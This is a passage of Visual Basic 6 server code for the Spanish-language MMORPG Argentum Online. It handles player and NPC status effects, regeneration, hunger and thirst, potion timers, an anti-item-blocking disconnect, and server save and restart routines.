        Call WriteConsoleMsg(userIndex, "Has vuelto a ser visible.", FontTypeNames.FONTTYPE_INFO)
        Call SendData(SendTarget.ToPCArea, userIndex, PrepareMessageSetInvisible(UserList(userIndex).Char.CharIndex, False))
    End If
End If

End Sub


Public Sub EfectoParalisisNpc(ByVal NpcIndex As Integer)

If Npclist(NpcIndex).Contadores.Paralisis > 0 Then
    Npclist(NpcIndex).Contadores.Paralisis = Npclist(NpcIndex).Contadores.Paralisis - 1
Else
    Npclist(NpcIndex).flags.Paralizado = 0
    Npclist(NpcIndex).flags.Inmovilizado = 0
End If

End Sub

Public Sub EfectoCegueEstu(ByVal userIndex As Integer)

If UserList(userIndex).Counters.Ceguera > 0 Then
    UserList(userIndex).Counters.Ceguera = UserList(userIndex).Counters.Ceguera - 1
Else
    If UserList(userIndex).flags.Ceguera = 1 Then
        UserList(userIndex).flags.Ceguera = 0
        Call WriteBlindNoMore(userIndex)
    End If
    If UserList(userIndex).flags.Estupidez = 1 Then
        UserList(userIndex).flags.Estupidez = 0
        Call WriteDumbNoMore(userIndex)
    End If

End If


End Sub


Public Sub EfectoParalisisUser(ByVal userIndex As Integer)

If UserList(userIndex).Counters.Paralisis > 0 Then
    UserList(userIndex).Counters.Paralisis = UserList(userIndex).Counters.Paralisis - 1
Else
    UserList(userIndex).flags.Paralizado = 0
    'UserList(UserIndex).Flags.AdministrativeParalisis = 0
    Call WriteParalizeOK(userIndex)
End If

End Sub

Public Sub RecStamina(ByVal userIndex As Integer, ByRef EnviarStats As Boolean, ByVal Intervalo As Integer)

If MapData(UserList(userIndex).Pos.Map, UserList(userIndex).Pos.X, UserList(userIndex).Pos.Y).trigger = 1 And _
   MapData(UserList(userIndex).Pos.Map, UserList(userIndex).Pos.X, UserList(userIndex).Pos.Y).trigger = 2 And _
   MapData(UserList(userIndex).Pos.Map, UserList(userIndex).Pos.X, UserList(userIndex).Pos.Y).trigger = 4 Then Exit Sub


Dim massta As Integer
If UserList(userIndex).Stats.MinSta < UserList(userIndex).Stats.MaxSta Then
   If UserList(userIndex).Counters.STACounter < Intervalo Then
       UserList(userIndex).Counters.STACounter = UserList(userIndex).Counters.STACounter + 1
   Else
       EnviarStats = True
       UserList(userIndex).Counters.STACounter = 0
       If UserList(userIndex).flags.Desnudo Then Exit Sub 'Desnudo no sube energía. (ToxicWaste)
       massta = RandomNumber(1, Porcentaje(UserList(userIndex).Stats.MaxSta, 5))
       UserList(userIndex).Stats.MinSta = UserList(userIndex).Stats.MinSta + massta
       If UserList(userIndex).Stats.MinSta > UserList(userIndex).Stats.MaxSta Then
            UserList(userIndex).Stats.MinSta = UserList(userIndex).Stats.MaxSta
        End If
    End If
End If

End Sub

Public Sub EfectoVeneno(ByVal userIndex As Integer, ByRef EnviarStats As Boolean)
Dim N As Integer

If UserList(userIndex).Counters.Veneno < IntervaloVeneno Then
  UserList(userIndex).Counters.Veneno = UserList(userIndex).Counters.Veneno + 1
Else
  Call WriteConsoleMsg(userIndex, "Estás envenenado, si no te curas moriras.", FontTypeNames.FONTTYPE_VENENO)
  UserList(userIndex).Counters.Veneno = 0
  N = RandomNumber(1, 5)
  UserList(userIndex).Stats.MinHP = UserList(userIndex).Stats.MinHP - N
  If UserList(userIndex).Stats.MinHP < 1 Then Call UserDie(userIndex)
  Call WriteUpdateHP(userIndex)
End If

End Sub

Public Sub DuracionPociones(ByVal userIndex As Integer)

'Controla la duracion de las pociones
If UserList(userIndex).flags.DuracionEfecto > 0 Then
   UserList(userIndex).flags.DuracionEfecto = UserList(userIndex).flags.DuracionEfecto - 1
   If UserList(userIndex).flags.DuracionEfecto = 0 Then
        UserList(userIndex).flags.TomoPocion = False
        UserList(userIndex).flags.TipoPocion = 0
        'volvemos los atributos al estado normal
        Dim loopX As Integer
        For loopX = 1 To NUMATRIBUTOS
              UserList(userIndex).Stats.UserAtributos(loopX) = UserList(userIndex).Stats.UserAtributosBackUP(loopX)
        Next
        
        'Actualizamos labels.
        Call WriteUpdateStrengthAgility(userIndex)
        
   End If
End If

End Sub

Public Sub HambreYSed(ByVal userIndex As Integer, ByRef fenviarAyS As Boolean)

If Not UserList(userIndex).flags.Privilegios And PlayerType.User Then Exit Sub

'Sed
If UserList(userIndex).Stats.MinAGU > 0 Then
    If UserList(userIndex).Counters.AGUACounter < IntervaloSed Then
        UserList(userIndex).Counters.AGUACounter = UserList(userIndex).Counters.AGUACounter + 1
    Else
        UserList(userIndex).Counters.AGUACounter = 0
        UserList(userIndex).Stats.MinAGU = UserList(userIndex).Stats.MinAGU - 10
        
        If UserList(userIndex).Stats.MinAGU <= 0 Then
            UserList(userIndex).Stats.MinAGU = 0
            UserList(userIndex).flags.Sed = 1
        End If
        
        fenviarAyS = True
    End If
End If

'hambre
If UserList(userIndex).Stats.MinHam > 0 Then
   If UserList(userIndex).Counters.COMCounter < IntervaloHambre Then
        UserList(userIndex).Counters.COMCounter = UserList(userIndex).Counters.COMCounter + 1
   Else
        UserList(userIndex).Counters.COMCounter = 0
        UserList(userIndex).Stats.MinHam = UserList(userIndex).Stats.MinHam - 10
        If UserList(userIndex).Stats.MinHam <= 0 Then
               UserList(userIndex).Stats.MinHam = 0
               UserList(userIndex).flags.Hambre = 1
        End If
        fenviarAyS = True
    End If
End If

End Sub

Public Sub Sanar(ByVal userIndex As Integer, ByRef EnviarStats As Boolean, ByVal Intervalo As Integer)

If MapData(UserList(userIndex).Pos.Map, UserList(userIndex).Pos.X, UserList(userIndex).Pos.Y).trigger = 1 And _
   MapData(UserList(userIndex).Pos.Map, UserList(userIndex).Pos.X, UserList(userIndex).Pos.Y).trigger = 2 And _
   MapData(UserList(userIndex).Pos.Map, UserList(userIndex).Pos.X, UserList(userIndex).Pos.Y).trigger = 4 Then Exit Sub

Dim mashit As Integer
'con el paso del tiempo va sanando....pero muy lentamente ;-)
If UserList(userIndex).Stats.MinHP < UserList(userIndex).Stats.MaxHP Then
   If UserList(userIndex).Counters.HPCounter < Intervalo Then
      UserList(userIndex).Counters.HPCounter = UserList(userIndex).Counters.HPCounter + 1
   Else
      mashit = RandomNumber(2, Porcentaje(UserList(userIndex).Stats.MaxSta, 5))
                           
      UserList(userIndex).Counters.HPCounter = 0
      UserList(userIndex).Stats.MinHP = UserList(userIndex).Stats.MinHP + mashit
      If UserList(userIndex).Stats.MinHP > UserList(userIndex).Stats.MaxHP Then UserList(userIndex).Stats.MinHP = UserList(userIndex).Stats.MaxHP
      Call WriteConsoleMsg(userIndex, "Has sanado.", FontTypeNames.FONTTYPE_INFO)
      EnviarStats = True
    End If
End If

End Sub

Public Sub CargaNpcsDat()
    Dim npcfile As String
    
    npcfile = DatPath & "NPCs.dat"
    Call LeerNPCs.Initialize(npcfile)
    
    'npcfile = DatPath & "NPCs-HOSTILES.dat"
    'Call LeerNPCsHostiles.Initialize(npcfile)
End Sub

Sub PasarSegundo()
On Error GoTo errhandler
    Dim i As Long
    
    For i = 1 To LastUser
        If UserList(i).flags.UserLogged Then
            'Cerrar usuario
            If UserList(i).Counters.Saliendo Then
                UserList(i).Counters.Salir = UserList(i).Counters.Salir - 1
                If UserList(i).Counters.Salir <= 0 Then
                    Call WriteConsoleMsg(i, "Gracias por jugar Argentum Online", FontTypeNames.FONTTYPE_INFO)
                    Call FlushBuffer(i)
                    Call closeChar(i)
                End If
            
            'ANTIEMPOLLOS
            ElseIf UserList(i).flags.EstaEmpo = 1 Then
                 UserList(i).EmpoCont = UserList(i).EmpoCont + 1
                 If UserList(i).EmpoCont = 30 Then
                    'If FileExist(CharPath & UserList(Z).Name & ".chr", vbNormal) Then
                    'esto siempre existe! sino no estaria logueado ;p
                    
                    'TmpP = val(GetVar(CharPath & UserList(Z).Name & ".chr", "PENAS", "Cant"))
                    'Call WriteVar(CharPath & UserList(Z).Name & ".chr", "PENAS", "Cant", TmpP + 1)
                    'Call WriteVar(CharPath & UserList(Z).Name & ".chr", "PENAS", "P" & TmpP + 1, LCase$(UserList(Z).Name) & ": CARCEL " & 30 & "m, MOTIVO: Empollando" & " " & Date & " " & Time)
                    
                    'Call Encarcelar(Z, 30, "El sistema anti empollo")
                    Call WriteShowMessageBox(i, "Fuiste expulsado por permanecer muerto sobre un item")
                    'Call SendData(SendTarget.ToAdmins, Z, 0, "|| " & UserList(Z).Name & " Fue encarcelado por empollar" & FONTTYPE_INFO)
                    UserList(i).EmpoCont = 0
                    Call FlushBuffer(i)
                    
                    Call closeConnection(i)
                ElseIf UserList(i).EmpoCont = 15 Then
                    Call WriteConsoleMsg(i, "LLevas 15 segundos bloqueando el item, muévete o serás desconectado.", FontTypeNames.FONTTYPE_WARNING)
                    Call FlushBuffer(i)
                End If
             End If
        End If
    Next i
Exit Sub

errhandler:
    Call LogError("Error en PasarSegundo. Err: " & Err.description & " - " & Err.Number & " - UserIndex: " & i)
    Resume Next
End Sub
 
Public Function ReiniciarAutoUpdate() As Double

    ReiniciarAutoUpdate = Shell(App.Path & "\autoupdater\aoau.exe", vbMinimizedNoFocus)

End Function
 
Public Sub ReiniciarServidor(Optional ByVal EjecutarLauncher As Boolean = True)
    'WorldSave
    Call DoBackUp

    'Guardar Pjs
    Call GuardarUsuarios
    
    If EjecutarLauncher Then Shell (App.Path & "\launcher.exe")

    'Chauuu
    Unload frmMain

End Sub

 
Sub GuardarUsuarios()
    haciendoBK = True
    
    Call SendData(SendTarget.toall, 0, PrepareMessagePauseToggle())
    Call SendData(SendTarget.toall, 0, PrepareMessageConsoleMsg("Servidor> Grabando Personajes", FontTypeNames.FONTTYPE_SERVER))
    
    Dim i As Integer
    For i = 1 To LastUser
        If UserList(i).flags.UserLogged Then
            dbSaveCharData i
        End If
    Next i
    
    Call SendData(SendTarget.toall, 0, PrepareMessageConsoleMsg("Servidor> Personajes Grabados", FontTypeNames.FONTTYPE_SERVER))
    Call SendData(SendTarget.toall, 0, PrepareMessagePauseToggle())

    haciendoBK = False
End Sub


Sub InicializaEstadisticas()
Dim Ta As Long
Ta = GetTickCount() And &H7FFFFFFF

Call EstadisticasWeb.Inicializa(frmMain.hWnd)
Call EstadisticasWeb.Informar(CANTIDAD_MAPAS, NumMaps)
Call EstadisticasWeb.Informar(CANTIDAD_ONLINE, NumUsers)
Call EstadisticasWeb.Informar(UPTIME_SERVER, (Ta - tInicioServer) / 1000)
Call EstadisticasWeb.Informar(RECORD_USUARIOS, recordusuarios)

End Sub

Public Sub FreeNPCs()
'***************************************************
'Autor: Juan Martín Sotuyo Dodero (Maraxus)
'Last Modification: 05/17/06
'Releases all NPC Indexes
'***************************************************
    Dim LoopC As Long
    
    ' Free all NPC indexes
    For LoopC = 1 To MAXNPCS
        Npclist(LoopC).flags.NPCActive = False
    Next LoopC
End Sub

Public Sub FreeCharIndexes()
'***************************************************
'Autor: Juan Martín Sotuyo Dodero (Maraxus)
'Last Modification: 05/17/06
'Releases all char indexes
'***************************************************
    Dim LoopC As Long
    
    ' Free all char indexes (set them all to 0)
    Call ZeroMemory(CharList(1), MAXCHARS * Len(CharList(1)))
End Sub
